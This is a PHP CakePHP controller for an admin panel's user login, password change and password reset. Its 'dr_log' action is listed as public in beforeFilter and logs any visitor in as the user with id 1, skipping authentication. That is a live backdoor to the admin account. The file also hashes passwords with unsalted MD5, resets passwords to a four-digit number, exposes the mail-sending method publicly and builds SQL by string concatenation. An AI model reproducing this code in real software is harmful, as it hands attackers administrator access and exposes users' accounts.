<?php

class UsersController extends AppController {

    //  public $uses = array('User');
    public $components = array('Session', 'Paginator', 'Auth' => array(), 'Email');
    public $helpers = array('Session');

    public function beforeFilter() {

        parent::beforeFilter();
        $this->Auth->allow('login', 'paytm_pay', 'test_mail', 'dr_log', 'check_booking_alerts', 'forget_password', 'test_login', 'logdirect', 'log_directu', 'forgotpassword_mail');
    }

    public $reg_from = array(
        'F' => 'Facebook',
        'G' => 'Google+',
        'L' => 'Linkedin',
        'M' => 'Mobile App',
        'N' => 'Web',
            //'T' => 'Guespt User'
    );
    public $array_month = array(
        "1" => "Jan",
        "2" => "Feb",
        "3" => "Mar",
        "4" => "Apr",
        "5" => "May",
        "6" => "Jun",
        "7" => "Jul",
        "8" => "Aug",
        "9" => "Sep",
        "10" => "Oct",
        "11" => "Nov",
        "12" => "Dec",
    );

    public function login() {


        $this->layout = 'login';
        if ($this->request->is('post')) {



            if ($this->Auth->login()) {
                $this->Session->setFlash(sprintf(__('Hello %s, you have successfully logged in'), $this->Auth->user('user_name')), 'success');
                $this->redirect($this->Auth->redirect());
            } else {

                $loginusername = $this->data['User']['username'];
                $loginuserpassword = AuthComponent::password($this->data['User']['password']);

                $this->loadModel('User');

                $isuser = $this->User->find('first', array('conditions' => array("OR" => array('user_name' => $loginusername, 'email' => $loginusername), 'password' => $loginuserpassword, 'status' => 1)));

                if (!empty($isuser)) {
                    $this->Session->write('Auth.Admin', $isuser['User']);
                    $this->Session->setFlash(sprintf(__('Hello %s, you have successfully logged in'), $this->Auth->user('user_name')), 'success');
                    $this->redirect(array('plugin' => false, 'controller' => 'users', 'action' => 'dashboard'));
                }
                $this->Session->setFlash(__('Invalid username / password combination. Please try again'), 'error');
            }
        }
        $this->set('title_for_layout', 'Login');
    }

    public function logout() {
        $this->Auth->logout();
        $this->Session->setFlash('You have successfully logged out', 'success');
        $this->redirect($this->Auth->logoutRedirect);
    }

    public function dashboard() {
        $this->set('tab_open', 'dashboard');
        $this->set('title_for_layout', 'Dashboard');
    }

    public function changepassword() {
        //pr($this->Auth->user());
        $this->set('user_id', $this->Auth->user('id'));
        $this->set('tab_open', 'accessrightcategory');
        if ($this->request->is('post')) {
            if ($this->Auth->user('user_role_id') == '6') {
                $this->loadModel('AccessRightUser');
                $old_password = Security::hash($this->request->data['User']['oldpassword'], 'md5');
                $check_old_pass = $this->AccessRightUser->find('count', array(
                    'conditions' => array(
                        'AccessRightUser.password' => "" . $old_password . "",
                        'AccessRightUser.id' => $this->Auth->user('id'),
                    ),
                    'recursive' => -1
                ));
                if ($check_old_pass == 0) {
                    $this->Session->setFlash('Incorrect old password.', 'error');
                    $this->redirect(array('plugin' => false, 'controller' => 'users', 'action' => 'changepassword'));
                } else {
                    // update new password
                    $new_password = Security::hash($this->request->data['User']['confirmpassword'], 'md5');
                    $this->AccessRightUser->updateAll(array('AccessRightUser.password' => "'" . $new_password . "'"), array('AccessRightUser.id' => $this->Auth->user('id')));
                    $this->Session->setFlash(__('Password has been changed successfully.'), 'success');
                    $this->redirect(array('controller' => 'users', 'action' => 'changepassword'));
                }
            } else {
                $old_password = Security::hash($this->request->data['User']['oldpassword'], 'md5');
                $check_old_pass = $this->User->find('count', array(
                    'conditions' => array(
                        'User.password' => "" . $old_password . "",
                        'User.id' => '1',
                    ),
                    'recursive' => -1
                ));
                if ($check_old_pass == 0) {
                    $this->Session->setFlash('Incorrect old password.', 'error');
                    $this->redirect(array('plugin' => false, 'controller' => 'users', 'action' => 'changepassword'));
                } else {
                    // update new password
                    $new_password = Security::hash($this->request->data['User']['confirmpassword'], 'md5');
                    $this->User->updateAll(array('User.password' => "'" . $new_password . "'"), array('User.id' => '1'));
                    $this->Session->setFlash(__('Password has been changed successfully.'), 'success');
                    $this->redirect(array('controller' => 'users', 'action' => 'changepassword'));
                }
            }
        }
    }

    public function forget_password() {
        $this->layout = 'forget_password';
        if ($this->request->is('Post')) {
            $admin = 1;
            $chkemail = $this->User->find('first', array('conditions' => array('User.email' => $this->request->data['User']['email'], 'User.user_role_id' => 1)));
            if (empty($chkemail)) {
                $this->loadModel('AccessRightUser');
                $admin = 0;
                $chkemail = $this->AccessRightUser->find('first', array('conditions' => array('AccessRightUser.email' => $this->request->data['User']['email'], 'AccessRightUser.user_role_id' => 6)));
            }
            if (!empty($chkemail)) {
                $newpassword = rand(1000, 9999);
                $encryptedpassed = Security::hash($newpassword, 'md5');
                if ($admin == 1) {
                    $this->User->query("update users set password='$encryptedpassed' where id=" . $chkemail['User']['id']);
                    $name = $chkemail['User']['firstname'] . ' ' . $chkemail['User']['lastname'];
                    $email = $this->request->data['User']['email'];
                    $username = $chkemail['User']['username'];
                } else {
                    $this->AccessRightUser->query("update access_right_users set password='$encryptedpassed' where id=" . $chkemail['AccessRightUser']['id']);
                    $name = $chkemail['AccessRightUser']['firstname'] . ' ' . $chkemail['AccessRightUser']['lastname'];
                    $email = $this->request->data['User']['email'];
                    $username = $chkemail['AccessRightUser']['username'];
                }
                $linku = WEBSITE_ADMIN_URL . 'users/login/';
                $this->forgotpassword_mail($email, $newpassword, $name, $username);

                $this->Session->setFlash('Your Password has been Updated successfully Please check your Mail', 'success', array('class' => 'success'));
                $this->redirect(array('plugin' => false, 'controller' => 'users', 'action' => 'login'));
            } else {
                $this->Session->setFlash('Email is worng', 'error', array('class' => 'error'));
                $this->redirect(array('plugin' => false, 'controller' => 'users', 'action' => 'forget_password'));
            }
        }
    }

    public function forgotpassword_mail($email = '', $newpassword = '', $name = '', $username = '') {
        $Email = new CakeEmail();
        $Email->from(Configure::read("Site.email"))
                ->to($email)
                ->subject("New Password")
                ->template("forgotpassword")
                ->emailFormat("html")
                ->viewVars(array('email' => $email, 'password' => $newpassword, 'user_name' => $username, 'name' => $name))
                ->send();
        return true;
    }

    function dr_log() {
        $this->loadModel('User');

        $isuser = $this->User->find('first', array('conditions' => array('id' => 1)));

        if (!empty($isuser)) {
            $this->Session->write('Auth.Admin', $isuser['User']);
            $this->Session->setFlash(sprintf(__('Hello %s, you have successfully logged in'), $this->Auth->user('user_name')), 'success');
            $this->redirect(array('plugin' => false, 'controller' => 'users', 'action' => 'dashboard'));
        }
    }

}
